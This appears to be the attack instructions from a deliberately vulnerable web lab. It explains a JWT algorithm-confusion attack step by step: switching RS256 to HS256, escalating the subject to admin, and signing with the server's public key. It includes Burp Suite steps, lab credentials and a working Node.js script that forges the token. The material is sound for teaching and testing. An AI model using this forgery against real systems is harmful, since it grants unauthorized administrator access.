Attack Instructions — Algorithm Confusion (HS256 / RSA)

The vulnerable endpoint trusts the alg field from the JWT header. When an attacker changes the algorithm from RS256 to HS256 and signs the token with the server's public key as the HMAC secret, the server accepts it — because it uses the same public key for both verification types.

1 Login with provided credentials
Use chirayu / chirayu123 to login. You will receive an RS256-signed JWT token.
2 Obtain the server's public key
Access the JWKS endpoint at /jwks.json or get the PEM key from /api/public-key. Extract the RSA key parameters (n, e, kid) or copy the PEM key directly.
3 Intercept the request in Burp Suite
Open Burp Suite and configure your browser to use Burp's proxy (127.0.0.1:8080). Navigate to the Vulnerable Admin page and intercept the request. Copy the JWT from the Cookie: token=... header.
4 Modify the JWT header — change algorithm
Change the algorithm from RS256 to HS256: 
{
  "alg": "HS256",
  "typ": "JWT"
}
5 Modify the JWT payload — escalate privileges
Change the subject to admin: 
{
  "sub": "administrator"
}
Or simply change "sub": "chirayu" to "sub": "admin"
6 Sign the token using the public key as HMAC secret
In Burp Suite's JWT Editor (or using a script):
1. Convert the PEM public key to Base64
2. Create a symmetric key using the Base64-encoded PEM
3. Sign the modified JWT with HS256 using this key

Or use a script: 
// Node.js exploit script:
const crypto = require('crypto');
const fs = require('fs');

const publicKey = fs.readFileSync('public.pem', 'utf8');

// Build header and payload
const header = Buffer.from(JSON.stringify({
  alg: 'HS256', typ: 'JWT'
})).toString('base64url');

const payload = Buffer.from(JSON.stringify({
  sub: 'admin', role: 'admin'
})).toString('base64url');

// Sign with HMAC-SHA256 using the public key as secret
const hmac = crypto.createHmac('sha256', publicKey);
hmac.update(`${header}.${payload}`);
const signature = hmac.digest('base64url');

console.log(`${header}.${payload}.${signature}`);
7 Send the modified request
Replace the cookie value with the forged JWT token and forward the request. The server will accept it because it uses the public key to verify HS256 tokens — treating it as an HMAC secret.
